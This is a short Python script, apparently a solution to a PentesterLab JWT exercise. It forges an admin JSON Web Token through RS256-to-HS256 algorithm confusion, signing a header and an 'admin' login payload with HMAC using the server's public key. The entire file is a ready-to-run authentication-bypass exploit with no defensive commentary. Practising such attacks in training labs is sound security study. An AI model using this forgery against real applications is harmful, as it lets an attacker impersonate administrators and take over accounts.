# Python 2 and 3 script to impersonate admin by creating new JWT token.
# To solve JWT 2 exercise on PentesterLab
import hmac
import base64
import hashlib

f = open("pub.pem")
key = f.read()
# RS => HS, login -> admin

str = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg.eyJsb2dpbiI6ImFkbWluIn0K"


# python3

sig = base64.urlsafe_b64encode(hmac.new(bytes(key,
    encoding='utf8'),str.encode('utf-8'),hashlib.sha256).digest()).decode('UTF-8').rstrip("=")
# python2 version
#sig = base64.urlsafe_b64encode(hmac.new(key,str,hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

print(str+"."+sig)







